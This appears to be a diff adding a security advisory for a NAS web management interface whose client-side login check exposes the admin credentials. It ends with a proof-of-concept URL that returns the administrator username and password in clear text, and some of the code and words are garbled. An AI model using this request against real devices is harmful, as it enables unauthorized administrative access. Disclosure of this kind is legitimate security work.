@@ -1,0 +1,27 @@
+=Vulnerability
+The web management UI validates the user.s login credentials through a JavaScript routine that queries hidden page 
+elements:
+
+ function LoginSubmit(){ var data = document.getElementById("Users").value; data = data.split(":");
+ 
+ var UserName = document.getElementById("UserName").value; var UserPasswd = document.getElementById("UserPasswd").value;
+ 
+ if((UserName==data[0])&&(UserPasswd==data[1])){  document.cookie = "2L:CH3HNAS"  location.replace ('index.html'); } 
+else {  document.getElementById("UserName").value = '';  document.getElementById("UserPasswd").value = '';  
+alert(getWord("login_unauthorized"));  setTimeout(function(){document.getElementById("UserName").focus();},10);  return 
+false; }}if(document.cookie.indexOf("2L:CH3ENAS") location.replace ('login.htm');}
+
+hese hidden elements are populated by two different JavaScript functions found in login.js:
+
+ function Login(){ getContent('','/cgi-bin/login.cgi?webmaster',"function:showLogin");}
+ 
+ function showLogin(msg){     msg = msg.split("\n");     window.document.getElementById('data').innerHTML = ''; 
+setTimeout(function(){document.getElementById("UserName").focus();},10);}
+ 
+The getContent function  is responsible for querying a URL and passing the result to the showLogin function.  In this 
+case the result of the web request consists of the username and password of the admin user in clear text form.
+
+=Proof of Concept
+Paste the following URL into a web browser.s address bar to obtain the administrator.s username and password:
+http:///cgi-bin/login.cgi?webmaster&1&Conceptronic2009
+
